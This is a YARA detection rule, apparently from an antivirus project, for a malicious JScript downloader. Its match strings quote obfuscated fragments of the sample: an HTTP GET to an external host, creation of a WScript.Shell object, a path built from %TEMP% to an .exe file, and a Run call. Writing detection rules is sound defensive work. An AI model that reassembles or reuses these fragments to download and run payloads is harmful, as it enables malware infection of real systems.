rule sig_20160401_806cf9120ed19002e01d7aec3fe1a73b {
  meta:
    description = "datamaliciousorder - file 20160401_806cf9120ed19002e01d7aec3fe1a73b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "19fb1f17f626c5b0e39c5d65d4a09e21a0068ba206047660dfd8d6583721d2e5"

  strings:
    $s1  = "WteOpj[DsgPtt](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "function WgEnu(VysLb, YdFaq){OoBvm = OoBvm * 1; return VysLb - YdFaq;};" fullword ascii
    $s3  = "var OtWzv = function SnnKxl() {return WScript[AycMlo](\"WScript\"+\".Shell\");}(), EcqEui = 11;" fullword ascii
    $s4  = "if (WteOpj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function FkaVc() {return OtWzv[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9lCgfFlMCQOnzb.ex\" + \"e\";};" fullword ascii
    $s6  = "function PyQs(){return HrArg + \"\";};" fullword ascii
    $s7  = "function XhpNyk() {return ((HmRn == true) && (HmRn == NpDzm)) ? 1 : OoBvm;};" fullword ascii
    $s8  = "function LxuNok(){return 23;};" fullword ascii
    $s9  = "function MjjTjx(LgEr){OtWzv[\"R\"+\"un\"](LgEr, OoBvm, OoBvm);};" fullword ascii
    $s10 = "var HmRn = false;" fullword ascii
    $s11 = "var NpDzm = false;" fullword ascii
    $s12 = "return WgEnu(VbhUrl, IrTow);" fullword ascii
    $s13 = "HmRn = true; " fullword ascii
    $s14 = "function ShaOd(){return AycMlo;};" fullword ascii
    $s15 = "NpDzm = true; " fullword ascii
    $s16 = "var TyrNw = new this[\"Date\"]();" fullword ascii
    $s17 = "function YbtMuq()" fullword ascii
    $s18 = "function UlgSr(YkFd) {var PdqNqa = (1, 2, 3, 4, 5, YkFd); return PdqNqa;};" fullword ascii
    $s19 = "}while (NoYc);" fullword ascii
    $s20 = "} catch(BjKef){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}